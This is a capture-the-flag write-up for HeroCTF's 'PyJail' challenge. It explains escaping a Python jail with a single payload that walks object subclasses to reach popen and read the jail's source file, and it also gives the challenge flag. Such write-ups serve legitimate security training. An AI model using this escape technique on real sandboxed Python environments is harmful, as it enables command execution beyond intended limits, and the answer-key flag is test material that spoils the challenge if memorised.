# PyJail

### Category

Misc

### Description

Welcome in jail. If it's not your first time, you should be out quickly. If it is your first rodeo, people have escape before you... I'm sure you'll be fine.

> Deploy on [deploy.heroctf.fr](https://deploy.heroctf.fr/)

Format : **Hero{flag}**<br>
Author : **Log_s**

### Write up

They are countless ways to espape this pyjail. The easiest way to get a command execution in most pyjails is to find a way to either the `__import__` function, or directly to the `os` module. In this case, the payload is the following :

```python
print(().__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('cat pyjail.py').read())
```

The detailed steps of this method are described here : https://ctftime.org/writeup/25816

But like I said, you probably found your own way, as this pyjail was pretty open x). The next should not be that easy !


### Flag

```Hero{nooooo_y0u_3sc4p3d!!}```
